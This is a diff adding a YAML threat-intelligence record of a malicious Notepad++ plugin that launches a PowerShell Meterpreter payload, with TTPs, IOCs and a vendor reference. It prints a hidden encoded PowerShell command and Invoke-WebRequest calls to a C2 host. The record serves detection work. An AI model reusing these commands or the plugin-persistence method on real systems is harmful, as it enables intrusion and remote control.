@@ -1,0 +1,43 @@
+description: "A malicious Notepad++ plugin is used to persist and launch a PowerShell\u2011\
+  based Meterpreter payload that connects to an internal C2 server."
+attribution: StrongPity (APT-C-41 / PROMETHIUM)
+TTPs:
+  processes:
+  - notepad++.exe
+  - powershell.exe
+  - cmd.exe
+  - whoami.exe
+  - calc.exe
+  - meterpreter
+  commandline:
+  - powershell -nop -w hidden -1WB0AGUAJAAUAFHAZQBYAHYAGQBJAGUAUABYAGKADEBOAEOAYQBUAGEAZWE1AHTAXQAGADOAUNE1AGHAGQBYAGKAJABSAFAACEBVAHQADWEJAGBADAADAFSATEE1AHQALEBTAGUAYWE1AHTASQBOAHKAUABYAGBAABVAGHAbNBSAFQAQBWAGUAXQAGADOAVABSAHHANQAYADSATAB3ADBADEBLAHCALQBVAGTASgB1AGHAJAAGAGAAZQBRACAAdBLAGTAYBSAGKAZQBUAHQAOWBAGYAKABAFHACQBZAHQAZQBEACAATEBLAHOALEEXAGUAYEBOAHTADWBAAHKAXQAGADOARNELAHOARABLAGYAYQB1AGNAGABQAHTAbWBAAHKAKAADACAAYQBKAGOACEBLAHACWAGACPADEBLACAAJABUAHUADABSACKASWAKAHCALgBWAHTADWBAAHKAPQBbAEAAZQBOACAAVWE1AGTAUEBLAHEAJQBLAHYAGABAADOADEBHAGUAGBAdWBAGWADNBHAGQAUNBBAHTAaQBUAGCAKAANAGRAIABBAHAAOGAVACBANQASADTALgAXADYAOAAUADEANAAUADEAWAADOAOAAWADGAMAAVAEBACQATAEAANIQBNAGEARQEZAHCAVWA2AEMALWBTAEAAMABJADAACEBPAGEATWADACKAONBJAEUANAAEACEAKABUAGUAGWALAGEAYEBAGUAYWBRACAATEB1AHQALEBXAGUAYgBDAGWARQBLAG4AdAADACAARABVAHCADEBSAGBAYQBKAFMAGABYAGKADEBACEATBOAHQAJABWADOALWAVADEAOQAYACAAMQAZADALGASADQALBAXADHAHQAGADEAMARAADAALWEPAHKAOABOADUATQBVAEUANQB3AFCANGBDACCAKQAPADSA
+  powershell:
+  - Invoke-WebRequest -Uri http://192.168.84.131:8086/0yBNSHOEYWNEC/SNATEr00
+  - Invoke-WebRequest -Uri http://192.168.84.131:8086/0yBNSHOEVWNGC
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - notepad++.exe loaded Npp_Persistence_Plugin.dll
+  network_connections:
+  - process: powershell.exe
+    destination: 192.168.84.131:8086
+  - process: meterpreter
+    destination: 192.168.84.131:50885
+  file_activity:
+  - '%PROGRAMFILES%\\Notepad++\\plugins\\Npp_Persistence_Plugin.dll'
+  persistence:
+  - plugin DLL loaded into Notepad++ plugins directory
+  process_relations:
+  - notepad++.exe -> powershell.exe -> meterpreter
+IOCs:
+  hashes:
+  - 90BC7FA90705148D8FFEEF9C3D55F349611905D3F7A4AD17B956CD7EE7A208AF
+  ips:
+  - 192.168.84.131
+  domains: []
+authors:
+- Derrick Masters
+- Loic Castel
+reference: https://www.cybereason.com/blog/threat-analysis-report-abusing-notepad-plugins-for-evasion-and-persistence
+date_of_publication: September 27, 2025
+file_creation_date: September 27, 2025
